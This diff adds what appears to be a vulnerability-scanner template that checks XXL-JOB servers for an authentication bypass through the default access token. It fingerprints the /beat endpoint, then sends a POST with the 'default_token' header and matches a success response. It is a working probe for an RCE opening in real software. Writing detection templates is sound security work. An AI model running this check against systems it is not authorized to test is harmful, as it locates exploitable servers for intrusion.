@@ -1,0 +1,39 @@
+id: poc-xxl-job-default-accesstoken-rce
+info:
+  name: XXL-JOB Default accessToken Authentication Bypass leading to RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+  metadata:
+    finger: xxl-job
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/beat"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"code\":500,\"msg"
+          - "invalid request, HttpMethod not support."
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/beat"
+    headers:
+      XXL-JOB-ACCESS-TOKEN: default_token
+    body: ""
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{\"code\":200"
